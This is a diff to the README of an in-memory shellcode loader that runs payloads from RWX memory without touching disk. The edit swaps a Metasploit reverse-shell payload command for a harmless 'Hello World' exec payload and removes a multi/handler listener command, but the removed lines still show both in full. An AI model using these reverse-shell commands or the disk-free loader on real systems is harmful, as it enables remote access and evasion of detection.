@@ -1,6 +1,6 @@
 # In-Memory Shellcode Detonator
 
-A minimalist Linux x86_64 loader that allocates RWX memory and executes raw shellcode entirely in memory, no disk artifacts, no staging files.
+A proof-of-concept Linux x86_64 loader that allocates RWX memory and executes raw shellcode entirely in memory, no disk artifacts, no staging files.
 
 ---
 
@@ -18,7 +18,7 @@ A minimalist Linux x86_64 loader that allocates RWX memory and executes raw shel
 - Memory Allocation (`mmap`): requests a private, anonymous RWX region for payload staging.  
 - Payload Injection: copies raw shellcode from a generated header (`shellcode.h`) into the allocated buffer.  
 - Direct Execution: casts buffer to a function pointer and transfers execution to shellcode.  
-- Minimal Syscalls: only `mmap`, `memcpy`, and invocation, no dynamic linking beyond standard C library.
+- Minimal Syscalls: only `mmap`, `memcpy`, and invocation—no dynamic linking beyond standard C library.
 
 **Internal Components**  
 ```
@@ -46,7 +46,7 @@ A minimalist Linux x86_64 loader that allocates RWX memory and executes raw shel
 
 1. **Generate Raw Shellcode**  
    ```bash
-   msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode
+   msfvenom -p linux/x64/exec CMD="echo 'Hello World!'" -f raw -o shellcode
    ```
 2. **Convert to Header**  
    ```bash
@@ -58,11 +58,6 @@ A minimalist Linux x86_64 loader that allocates RWX memory and executes raw shel
    ```
 
 ### Execution Examples
-
-- **Start Listener**  
-  ```bash
-  msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 127.0.0.1; set LPORT 1337; set EXITONSESSION false; exploit -j"
-  ```
 
 - **Detonate Payload**  
   ```bash
